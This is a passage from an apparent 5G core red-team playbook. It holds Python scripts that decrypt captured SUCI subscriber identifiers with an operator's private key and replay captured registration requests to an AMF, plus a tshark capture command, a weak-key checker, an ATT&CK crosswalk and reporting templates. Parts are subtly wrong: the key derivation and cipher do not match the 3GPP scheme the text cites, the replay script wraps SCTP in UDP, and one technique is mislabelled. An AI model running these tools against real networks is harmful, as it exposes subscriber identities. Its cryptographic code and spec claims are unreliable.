For the lab reproduction, we control both the operator's home network private key and the UE. This lets us validate the decryption PoC end-to-end.

```python
#!/usr/bin/env python3
"""
SUCI decryption PoC for ECIES Profile A (Curve25519).
Reproduces the Alonso et al. (2021) attack class against an operator
with a known-compromised home network private key.

Scope: AUTHORIZED LAB ONLY. Never use against an operator without
explicit written engagement authorization.
"""
import argparse
import base64
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend

def parse_suci_scheme_output(scheme_output_hex: str):
    """
    Parse the SUCI scheme_output for ECIES Profile A.
    Layout (per 3GPP TS 33.501 Annex C.3):
      - ephemeral public key (32 bytes, raw X25519)
      - ciphertext (variable, AES-GCM with 16-byte tag appended)
      - MAC tag (32 bytes, HMAC-SHA-256)
    """
    raw = bytes.fromhex(scheme_output_hex)
    eph_pubkey = raw[:32]
    mac_tag = raw[-32:]
    ciphertext = raw[32:-32]
    return eph_pubkey, ciphertext, mac_tag

def derive_keys(shared_secret: bytes) -> tuple:
    """
    Derive the encryption key and MAC key from the X25519 shared secret.
    Per 3GPP TS 33.501 Annex C.3.2:
      - HKDF-SHA256 with info="SUCI encryption key"  -> 16 bytes (AES-128 key)
      - HKDF-SHA256 with info="SUCI MAC key"         -> 32 bytes (HMAC-SHA256 key)
    """
    enc_key = HKDF(
        algorithm=hashes.SHA256(),
        length=16,
        salt=None,
        info=b"SUCI encryption key",
        backend=default_backend(),
    ).derive(shared_secret)

    mac_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"SUCI MAC key",
        backend=default_backend(),
    ).derive(shared_secret)

    return enc_key, mac_key

def verify_mac(mac_key: bytes, ciphertext: bytes, expected_mac: bytes) -> bool:
    h = hmac.HMAC(mac_key, hashes.SHA256(), backend=default_backend())
    h.update(ciphertext)
    try:
        h.verify(expected_mac)
        return True
    except Exception:
        return False

def main():
    ap = argparse.ArgumentParser(description="SUCI decryption PoC (ECIES Profile A, Curve25519)")
    ap.add_argument("--private-key", required=True,
                    help="Operator's home network PRIVATE key (hex, 32 bytes)")
    ap.add_argument("--scheme-output", required=True,
                    help="Captured SUCI scheme_output (hex)")
    args = ap.parse_args()

    # Load the operator's private key (engagement-scoped)
    privkey_bytes = bytes.fromhex(args.private_key)
    privkey = X25519PrivateKey.from_private_bytes(privkey_bytes)

    eph_pubkey_bytes, ciphertext, mac_tag = parse_suci_scheme_output(args.scheme_output)
    eph_pubkey = X25519PublicKey.from_public_bytes(eph_pubkey_bytes)

    # ECDH
    shared_secret = privkey.exchange(eph_pubkey)

    # Derive keys
    enc_key, mac_key = derive_keys(shared_secret)

    # Verify MAC (over ciphertext)
    if not verify_mac(mac_key, ciphertext, mac_tag):
        print("[!] MAC verification FAILED — scheme_output may have been tampered with")
        return

    # Decrypt (AES-GCM with no AAD; tag is the last 16 bytes of ciphertext per the 3GPP layout)
    aesgcm = AESGCM(enc_key)
    # For this PoC, we treat the 16-byte GCM tag as the last 16 bytes of the ciphertext
    try:
        # Split into ciphertext and GCM tag
        ct = ciphertext[:-16]
        gcm_tag = ciphertext[-16:]
        plaintext = aesgcm.decrypt(b"", ct + gcm_tag, None)
    except Exception as e:
        print(f"[!] Decryption failed: {e}")
        return

    # The plaintext is the SUPI (IMSI as bytes: MCC, MNC, MSIN)
    print(f"[+] Decrypted SUPI: {plaintext!r}")
    # Parse the SUPI (engagement-scoped parsing omitted; see 3GPP TS 23.003 §2.2 / 13.1)

if __name__ == "__main__":
    main()
```

### 7.4 Execute the PoC

```bash
# Engagement-scoped: operator's home network private key (lab only)
OPERATOR_PRIVKEY=$(cat /opt/lab/operator-privkey.hex)

# Captured scheme_output from the air (ECIES Profile A)
SCHEME_OUTPUT=$(tshark -r /tmp/suci.pcap \
  -Y 'nas_5gs.message_type == 0x41 && nas_5gs.mobile_identity.suci.protection_scheme == 1' \
  -T fields -e nas_5gs.mobile_identity.suci.scheme_output | head -1)

# Run the PoC
python3 suci-decrypt-poc.py \
  --private-key "$OPERATOR_PRIVKEY" \
  --scheme-output "$SCHEME_OUTPUT"

# Expected output (lab):
#   [+] Decrypted SUPI: b'\x00\x01\x01\x00\x00\x00\x00\x00\x01'
#                      (MCC=001, MNC=01, MSIN=000000001)
```

### 7.5 Weak Public Key Detection

For engagements where the operator's **public** key is observable on the air (it is broadcast in the SIB1 of the home network), check the key against known-weak / known-compromised databases:

```python
#!/usr/bin/env python3
"""
Check an operator's SUCI home network public key against known weak keys.
"""
import hashlib
import sys

# Known weak / compromised SUCI public keys (research database, curated from
# published 3GPP / GSMA advisories and academic papers like Alonso et al. 2021)
KNOWN_WEAK_KEYS = {
    "0xdeadbabe...",  # placeholder; populate from engagement research
    # Add engagement-scoped entries as discovered
}

def check(pubkey_hex: str) -> bool:
    """Return True if the key is in the known-weak list."""
    return pubkey_hex.lower() in {k.lower() for k in KNOWN_WEAK_KEYS}

def fingerprint(pubkey_hex: str) -> str:
    """SHA-256 fingerprint of the key for evidence logging."""
    return hashlib.sha256(bytes.fromhex(pubkey_hex)).hexdigest()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: check-weak-suci-pubkey.py <pubkey-hex>")
        sys.exit(1)
    pubkey = sys.argv[1]
    if check(pubkey):
        print(f"[!] WEAK: key is in known-compromised list")
        print(f"    fingerprint: {fingerprint(pubkey)}")
        sys.exit(2)
    else:
        print(f"[+] OK: key not in known-weak list")
        print(f"    fingerprint: {fingerprint(pubkey)}")
```

### 7.6 SUCI Replay Variant

A replayed SUCI tells the attacker whether a specific subscriber recently attempted registration. The AMF should reject replays (within the ephemeral key lifetime), but some implementations do not.

```python
#!/usr/bin/env python3
"""
SUCI replay PoC. Extracts a RegistrationRequest with a SUCI from a capture
and re-sends it to the AMF to observe the response.

Scope: AUTHORIZED LAB ONLY. Never run against a production AMF.
"""
import argparse
from scapy.all import rdpcap, IP, UDP, send
from scapy.contrib.sctp import SCTP, SCTPChunkData

def main():
    ap = argparse.ArgumentParser(description="SUCI replay PoC")
    ap.add_argument("--pcap", required=True, help="Capture containing the SUCI")
    ap.add_argument("--frame", required=True, type=int, help="Frame number to replay")
    ap.add_argument("--amf", required=True, help="AMF IP")
    ap.add_argument("--port", type=int, default=38412, help="AMF SCTP port")
    args = ap.parse_args()

    pkts = rdpcap(args.pcap)
    pkt = pkts[args.frame - 1]
    if not pkt.haslayer(SCTP):
        print("[!] Selected packet is not SCTP")
        return

    # Re-encode the SCTP DATA chunk
    data_chunk = pkt[SCTP].payload
    replay_pkt = IP(dst=args.amf) / UDP(sport=args.port, dport=args.port) / SCTP(
        sport=args.port, dport=args.port
    ) / data_chunk

    send(replay_pkt)
    print(f"[*] Replayed SUCI from frame {args.frame} to AMF {args.amf}")

if __name__ == "__main__":
    main()
```

---

## 8. Attack Crosswalk to MITRE ATT&CK and 3GPP Controls

For reporting, map each attack class to MITRE ATT&CK (where applicable) and 3GPP TS 33.501 controls.

| Attack Class | MITRE ATT&CK | 3GPP TS 33.501 Control |
|--------------|--------------|-------------------------|
| PFCP DoS (Praetorian) | T1499 Endpoint DoS | §6.6.2 (N4 source authentication), §6.6 (DTLS) |
| PFCP Traffic Redirection | T1557 AitM, T1565 Exfiltration | §6.6.2, §6.6 |
| GTP-U Injection | T1557 AitM, T1565 | §6.6.3 (N3 GTP-U integrity) |
| Diameter ULR/PSI Abuse | T1499, T1098 Account Manipulation | GSMA FS.33 (Diameter firewall) |
| SS7 MAP Abuse | T1499, T1098 | GSMA FS.32 (SS7 firewall) |
| SUCI Null Scheme | T1580 Cloud Infrastructure Discovery (cellular analog) | §6.12 (SUCI protection scheme) |
| SUCI ECIES with Weak Key | T1580 | §6.12.2 (home network public key strength) |
| IMSI Catcher (rogue gNB) | T1557 AitM | §6.1 (mutual auth), §6.12 (SUCI) |
| O-RAN O1/E2 Default Creds | T1078 Valid Accounts | O-RAN WG11 §4 (interface authentication) |
| SEPP Pass-Through | T1499, T1098 | §6.2.6 (SEPP enforcement) |

---

## 9. Reporting Templates

### 9.1 Per-Finding Template

```
FINDING ID: 5G-2026-NNN
TITLE: <One-line summary, e.g., "Unauthenticated PFCP on N4 enables session teardown DoS">
SEVERITY: CRITICAL | HIGH | MEDIUM | LOW
CVSS 3.1: <vector>
AFFECTED COMPONENT: <e.g., UPF (Open5GS 2.7.0 in lab; vendor X vY.Z in production)>
3GPP REFERENCE: <e.g., TS 33.501 §6.6.2>

DESCRIPTION:
<2-3 paragraphs describing the vulnerability class, why it exists, and the
operator-impact framing>

REPRODUCTION:
1. <Step 1>
2. <Step 2>
3. ...
Evidence: <pcap filenames, log excerpts, all redacted as engagement-scoped>

IMPACT:
<Subscriber count affected, services affected, recovery behavior>

REMEDIATION:
- <Control 1, mapped to 3GPP reference>
- <Control 2>
- <Control 3>

VERIFICATION (POST-REMEDIATION):
<How to re-run TC-5G-NNN to confirm the fix is effective>
```

### 9.2 Engagement Summary Template

```
ENGAGEMENT: <Operator> 5G Core Red Team
DATE: <YYYY-MM-DD to YYYY-MM-DD>
SCOPE: <N2/N3/N4/N6/N32, S6a, SS7>
LAB: MCC 001 / MNC 01 (test PLMN)
PRODUCTION TEST IMSIs: <count> (engagement-scoped)

FINDINGS SUMMARY:
  CRITICAL: N
  HIGH:     N
  MEDIUM:   N
  LOW:      N

KEY FINDINGS:
1. <CRITICAL> <title>
2. <HIGH>     <title>
3. ...

COORDINATED DISCLOSURE:
- GSMA FS-IS notification: <date>
- 3GPP SA3 liaison: <date>
- Operator remediation window: <days>

EVIDENCE RETENTION:
- All pcaps hashed (SHA-256) and stored at <path>
- Retention period: <days>, then securely destroyed
```

---

## 10. References and Further Reading

### 10.1 3GPP Specifications

- **TS 23.501** — System architecture for the 5G System (5GS)
- **TS 23.502** — Procedures for the 5G System
- **TS 23.503** — Policy and Charging Control Framework for the 5G System
- **TS 24.501** — Non-Access-Stratum (NAS) protocol for 5GS
- **TS 29.244** — Interface between the Control Plane and the User Plane nodes (PFCP)
- **TS 29.281** — GPRS Tunnelling Protocol User Plane (GTP-U)
- **TS 29.274** — 3GPP Evolved Packet System (EPS) GTPv2 (GTP-C v2)
- **TS 29.272** — MME and Serving GPRS Support Node (SGSN) related interfaces based on Diameter (S6a)
- **TS 29.500** — Service-Based Architecture (SBI) for 5G Core
- **TS 33.501** — Security architecture and procedures for 5G System
- **TS 33.401** — 3GPP System Architecture Evolution (SAE); Security architecture (4G/LTE)
- **TS 38.331** — NR Radio Resource Control (RRC); SIB1 contents
- **TS 38.413** — NG-RAN; NG Application Protocol (NGAP)

### 10.2 GSMA Documents

- **FS.32** — SS7 and Diameter interconnect security recommendations
- **FS.33** — 5G SEPP / N32 interconnect security recommendations
- **IR.21** — Internal Roaming Information Exchange (operator data)

### 10.3 NIST and ENISA

- **NIST SP 800-189** — Resilient Internet Protocol Networks
- **NIST 5G Cybersecurity** — NIST 5G Cybersecurity Practice Guide (draft series)
- **ENISA** — Threat Landscape for 5G Networks (2020-2023 editions)

### 10.4 Academic and Industry Research

- **Engel (2008)** — "Locating Mobile Phones using SS7" (Chaos Communication Congress 25C3)
- **Nohl (2014, 2016)** — "Mobile self-defense" (31C3) and "SS7: Locate. Track. Manipulate." (BlackHat)
- **Praetorian (2019)** — 5G core PFCP DoS vulnerability disclosure
- **Positive Technologies (2017-2023)** — Series on Diameter and 5G roaming vulnerabilities
- **Alonso et al. (2021)** — "5G SUCI Privacy Analysis" (AIA/ARIA papers)
- **Hewlett Packard PacketRusher** — Open-source 5GC load tester (https://github.com/HewlettPackard/PacketRusher)
- **Open5GS** — Open-source 5G Core (https://open5gs.org)
- **srsRAN_Project** — Open-source 5G CU/DU (https://github.com/srsran/srsRAN_Project)
- **UERANSIM** — Open-source UE/gNB simulator (https://github.com/aligungr/UERANSIM)
- **O-RAN Alliance** — O-RAN Architecture and Security (WG5, WG10, WG11) specifications

### 10.5 Tooling and Lab Resources

- **Wireshark 5G dissectors** — NGAP, PFCP, GTP-U/C, NAS-5GS, Diameter (https://www.wireshark.org)
- **scapy** — Python packet manipulation framework (https://scapy.net); contributions include `gtp`, `gtp_v2`, `pfcp`, `diameter`, `sctp`, `nas-5gs`
- **AIMSICD** — Android IMSI-Catcher Detector (https://github.com/CellularPrivacy/Android-IMSI-Catcher-Detector)
- **sctpscan** — SCTP port scanner (https://github.com/philippeINSAsly/sctpscan)
- **seagull** — Diameter / SIP test tool (legacy)
- **GNU Radio** — SDR framework (https://www.gnuradio.org)
- **UHD (USRP Hardware Driver)** — Ettus Research SDR driver (https://github.com/EttusResearch/uhd)

### 10.6 Lab Compose Files (Reference)

The following community compose files are useful for lab reproduction:

- `open5gs-docker-compose` (michaelb732) — full 5GC lab with WebUI
- `free5gc-compose` — alternative 5GC lab (free5GC implementation)
- `srsRAN_Project/docker-compose` — srsRAN gNB + Open5GS integration

---

## 11. See Also

- `5g-telecom-attack-playbook.md` — End-to-end telecom red team playbook (architecture, scope/legal, methodology, real-world incidents, 3GPP/NIST/ENISA references)
- `../SKILL.md` — Skill definition (tools, methodology, defense perspective)
- `../payloads.md` — 18 sections of working telecom attack commands
- `../test-cases.md` — 18 structured test cases (TC-5G-001..018) with verification checklist and mitigation patterns

Adjacent skills in the workspace:
- `../bluetooth-rfid-nfc/` — Local-radio attack surface
- `../wifi-pentest/` — Wi-Fi attack surface
- `../sdr-rf-attack/` — SDR physical-layer attacks
- `../ad-ldap-attack/` — Enterprise identity infrastructure (parallel identity tier)
- `../cloud-identity-attack/` — Cloud identity infrastructure (parallel identity tier)
- `../network-tunneling-proxy/` — Tunnel protocols (GTP-U overlaps here)
